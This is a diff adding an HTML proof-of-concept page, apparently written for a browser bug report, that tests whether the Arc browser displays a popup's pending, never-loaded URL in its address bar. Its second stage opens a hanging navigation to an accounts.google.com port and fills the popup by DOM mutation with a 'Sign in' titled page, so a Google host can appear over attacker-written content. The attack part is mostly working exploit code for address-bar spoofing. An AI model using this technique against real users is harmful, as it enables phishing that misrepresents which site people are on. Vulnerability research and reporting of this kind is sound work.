@@ -1,0 +1,143 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>A3 &mdash; does Arc paint a popup's PENDING url?</title>
+<style>
+ :root{color-scheme:light}
+ body{font:16px/1.45 -apple-system,system-ui,sans-serif;margin:0;padding:18px 16px 50vh;background:#fff;color:#111}
+ h1{font-size:19px;margin:0 0 4px}
+ h2{font-size:15px;margin:24px 0 6px;text-transform:uppercase;letter-spacing:.04em;color:#555}
+ pre{background:#0b0b0b;color:#8f8;padding:10px;border-radius:8px;font:11.5px/1.5 ui-monospace,Menlo,monospace;white-space:pre-wrap;word-break:break-all;margin:8px 0}
+ button{display:block;width:100%;box-sizing:border-box;text-align:left;padding:13px 14px;margin:7px 0;font:14px/1.3 -apple-system,system-ui;border:1px solid #ccc;border-radius:11px;background:#f6f6f8;color:#111}
+ .go{background:#1a73e8;border-color:#1a73e8;color:#fff;font-weight:600;text-align:center}
+ .arm{background:#c00;border-color:#c00;color:#fff;font-weight:600;text-align:center}
+ .vuln{border-color:#c00;background:#ffecec}
+ .safe{border-color:#2a7;background:#eefbf4}
+ #done{display:none;margin:20px 0;padding:16px;border:2px solid #2a7;border-radius:12px;background:#eefbf4;font-size:14px}
+ .n{color:#555;font-size:13px}
+</style>
+
+<h1>A3 &mdash; STEP 1 is the whole experiment</h1>
+<p class="n">This is a lens-closing control, not a likely finding. Step 1 opens a popup whose
+navigation hangs forever and then does <b>nothing at all</b> &mdash; no paint, no write, no
+<code>stop()</code>. Whatever the pill shows over that blank popup tells you, in one tap,
+whether Arc ever sources the omnibox from a pending popup URL. If it does not, the entire
+popup/pending class is closed and you can stop.</p>
+
+<pre id="env"></pre>
+
+<h2>Step 1 &middot; control (open, observe, touch nothing)</h2>
+<button class="go" id="s1">open popup &rarr; hanging URL, no paint</button>
+<button id="s1b">alternate port (use if the first one errors instantly)</button>
+<p class="n">The popup should sit blank with a spinner for 30&ndash;75s until the OS connect
+timeout. Read the pill, then switch back to this tab.</p>
+
+<div id="q1"></div>
+<div id="done"></div>
+
+<div id="stage2" style="display:none">
+ <h2>Step 2 &middot; only reachable because step 1 said the pending URL is painted</h2>
+ <p class="n">Same hanging navigation, but the opener now paints the popup by pure DOM mutation
+ (<code>document.title</code>, <code>body.innerHTML</code>, <code>appendChild</code>). It never
+ calls <code>document.open()</code>/<code>write()</code>/<code>close()</code>/<code>stop()</code>,
+ because each of those runs "stop document loading", aborts the provisional navigation, and hands
+ Arc the exact teardown event its 1.48.0 fallback hooks &mdash; which is why all nine of your
+ earlier variants landed on <code>about:blank</code>.</p>
+ <button class="arm" id="s2">ARM &mdash; hang + DOM-paint</button>
+</div>
+
+<pre id="log">log:</pre>
+
+<script>
+(function(){
+ var BRAND = ['accounts','google','com'].join('.');
+ var URLS = ['https://'+BRAND+':4444/', 'https://www.apple.com:8443/'];
+ document.getElementById('env').textContent =
+   'opener origin : ' + location.origin + '\n' +
+   'victim URL #1 : ' + URLS[0] + '  (SYN blackholed, silent for 40s+)\n' +
+   'victim URL #2 : ' + URLS[1] + '  (same, use if #1 RSTs on your network)\n\n' +
+   'Do NOT substitute a host you have not probed: many hosts RST closed ports in\n' +
+   'a few seconds, which fails the load instantly and destroys the test.\n\n' +
+   'NOT USED, deliberately: HTTP 204 (e.g. /generate_204). A 204 makes WebKit call\n' +
+   'stopLoadingForPolicyChange -> didFailProvisionalLoad, and PageLoadState clears\n' +
+   'the provisional URL inside WebKit before the shell ever sees it. That collapses\n' +
+   'straight back into the already-fixed bug.';
+
+ function L(s){ var l=document.getElementById('log'); l.textContent += '\n'+s; }
+ var W = null;
+
+ function open1(u){
+   W = window.open(u, 'ctl'+Math.random().toString(36).slice(2,7));
+   if(!W){ L('popup blocked -- tap again, popups need the gesture'); return; }
+   L('opened ' + u + '  -- PHOTOGRAPH THE ADDRESS BAR, touch nothing else');
+   buildQ1();
+ }
+ document.getElementById('s1').onclick=function(){ open1(URLS[0]); };
+ document.getElementById('s1b').onclick=function(){ open1(URLS[1]); };
+
+ function buildQ1(){
+   var q=document.getElementById('q1'); if(q.dataset.b) { q.scrollIntoView({block:'center'}); return; } q.dataset.b='1';
+   var h=document.createElement('h2'); h.textContent='What did the pill show over the blank popup?'; q.appendChild(h);
+   [{v:1,t:'<b>'+BRAND+'</b> or <b>'+BRAND+':4444</b> (the URL that never loaded)',
+     w:'Arc paints the pending popup URL. The class is LIVE -- proceed to step 2.'},
+    {v:1,t:'<b>www.apple.com</b> / <b>www.apple.com:8443</b>',
+     w:'Same result via the alternate URL. Class LIVE -- proceed to step 2.'},
+    {v:0,t:'<b>about:blank</b>',
+     w:'Arc sources the pill from the committed URL only. The whole popup/pending-URL family is closed on 1.48.0: nothing you can put in a never-committing popup navigation will ever reach the pill. Stop here and do not spend another session on it.'},
+    {v:0,t:'<b>'+location.hostname+'</b> (this page, the opener origin)',
+     w:'Committed-URL/opener fallback, truthful. Same conclusion: the popup/pending family is closed.'},
+    {v:0,t:'nothing at all / an empty "Search or enter website" placeholder',
+     w:'That is the pre-fix #3837622 state, so if it reproduces it is your existing report, not a new one -- note it on #3837622 rather than filing again. It is also WebKit\'s ordinary empty-new-tab state, so screenshot the tab-switcher too before claiming a regression.'}
+   ].forEach(function(o){
+     var b=document.createElement('button'); b.className=o.v?'vuln':'safe'; b.innerHTML=o.t;
+     b.onclick=function(){
+       document.getElementById('done').style.display='none';
+       if(o.v){
+         document.getElementById('stage2').style.display='block';
+         L('STEP 1 = LIVE. stage 2 unlocked.');
+         document.getElementById('stage2').scrollIntoView({block:'center'});
+       } else {
+         document.getElementById('stage2').style.display='none';
+         var d=document.getElementById('done'); d.style.display='block';
+         d.innerHTML='<b>Class closed.</b> '+o.w;
+         d.scrollIntoView({block:'center'});
+       }
+     };
+     q.appendChild(b);
+   });
+   q.scrollIntoView({block:'center'});
+ }
+
+ // ---- step 2: DOM-only paint, never aborts the provisional navigation ----
+ function paint(w){
+   try{
+     w.document.title = 'Sign in';
+     var d = w.document, b = d.body;
+     b.setAttribute('style','margin:0;padding:34px 22px;font:16px/1.5 -apple-system,system-ui;background:#fff;color:#111;text-align:center');
+     b.innerHTML = '';
+     var h=d.createElement('div');
+     h.setAttribute('style','font:800 34px/1.1 -apple-system;color:#c00;margin:40px 0 18px');
+     h.textContent='pwned by 33x';
+     var p=d.createElement('div');
+     p.setAttribute('style','font:14px/1.6 -apple-system;color:#333;word-break:break-all');
+     p.innerHTML = 'Every pixel on this tab was written by <b>'+location.hostname+'</b>.<br>'+
+                   'No document from the host shown in the address bar was ever loaded, '+
+                   'requested successfully, or committed.<br><br>'+
+                   '<span style="font:11.5px ui-monospace;color:#666">document.URL = '+
+                   (function(){try{return w.document.URL}catch(e){return '?'}})()+'<br>'+
+                   new Date().toISOString()+'</span>';
+     b.appendChild(h); b.appendChild(p);
+     L('painted by DOM mutation; navigation still provisional');
+   }catch(e){ L('paint failed: '+e.message); }
+ }
+ document.getElementById('s2').onclick=function(){
+   var w = window.open(URLS[0], 'arm'+Math.random().toString(36).slice(2,7));
+   if(!w){ L('popup blocked'); return; }
+   paint(w);
+   setTimeout(function(){paint(w)}, 900);
+   setTimeout(function(){paint(w)}, 3500);
+   try{ w.onfocus = function(){ paint(w); }; }catch(e){}
+   L('ARMED -- screenshot the popup: red "pwned by 33x" body + a google host in the pill.');
+ };
+})();
+</script>
